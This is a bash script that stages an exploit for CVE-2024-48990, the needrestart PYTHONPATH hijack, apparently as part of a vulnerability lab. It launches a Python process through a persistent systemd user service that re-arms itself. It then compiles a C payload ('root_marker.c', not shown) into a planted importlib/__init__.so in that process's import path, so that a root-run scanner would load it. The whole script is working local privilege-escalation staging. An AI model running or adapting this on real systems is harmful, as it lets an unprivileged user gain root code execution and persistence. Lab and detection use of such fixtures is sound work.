#!/usr/bin/env bash
set -euo pipefail

# Preconditions
[[ "$(id -u)" -ne 0 ]] || { echo "run as the developer, not root" >&2; exit 1; }
command -v cc >/dev/null || { echo "C compiler required" >&2; exit 1; }
command -v python3 >/dev/null
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXTURE_DIR="${HOME}/.local/share/package-lab/cve-2024-48990"
PID_FILE="${FIXTURE_DIR}/python.pid"
LOOP_FILE="${FIXTURE_DIR}/loop.py"
USER_UNIT_DIR="${HOME}/.config/systemd/user"
USER_UNIT="package-lab-rearm.service"
USER_RUNTIME_DIR="/run/user/$(id -u)"

user_systemctl() {
  XDG_RUNTIME_DIR="$USER_RUNTIME_DIR" \
    DBUS_SESSION_BUS_ADDRESS="unix:path=${USER_RUNTIME_DIR}/bus" \
    systemctl --user "$@"
}

# Python fixture
user_systemctl disable --now "$USER_UNIT" >/dev/null 2>&1 || true
if [[ -f "$PID_FILE" ]]; then
  OLD_PID="$(cat "$PID_FILE")"
  [[ "$OLD_PID" =~ ^[0-9]+$ ]] && kill "$OLD_PID" 2>/dev/null || true
fi
rm -rf "$FIXTURE_DIR"
mkdir -p "$FIXTURE_DIR/importlib"
printf 'import time\nwhile True:\n    time.sleep(3600)\n' > "$LOOP_FILE"
install -m 0755 "$SCRIPT_DIR/armed-supervisor.sh" "$FIXTURE_DIR/armed-supervisor.sh"
install -m 0755 "$SCRIPT_DIR/heartbeat.py" "$FIXTURE_DIR/heartbeat.py"
mkdir -p "$USER_UNIT_DIR"
install -m 0644 "$SCRIPT_DIR/package-lab-rearm.service" "$USER_UNIT_DIR/$USER_UNIT"

# Start the Python process before placing the controlled import library.
user_systemctl daemon-reload
user_systemctl enable --now "$USER_UNIT"
for _ in $(seq 1 20); do
  [[ -s "$PID_FILE" ]] && break
  sleep 0.1
done
[[ -s "$PID_FILE" ]] || { echo "persistent user service did not publish a Python PID" >&2; exit 1; }
PYTHON_PID="$(cat "$PID_FILE")"
[[ "$PYTHON_PID" =~ ^[0-9]+$ ]] && kill -0 "$PYTHON_PID"
cc -shared -fPIC -O2 -Wall -Wextra "$SCRIPT_DIR/root_marker.c" -o "$FIXTURE_DIR/importlib/__init__.so.tmp"
mv "$FIXTURE_DIR/importlib/__init__.so.tmp" "$FIXTURE_DIR/importlib/__init__.so"
chmod 0700 "$FIXTURE_DIR"
chmod 0755 "$FIXTURE_DIR/importlib"
chmod 0644 "$FIXTURE_DIR/importlib/__init__.so"
printf 'armed pid=%s PYTHONPATH=%s persistent_service=%s\n' "$PYTHON_PID" "$FIXTURE_DIR" "$USER_UNIT"
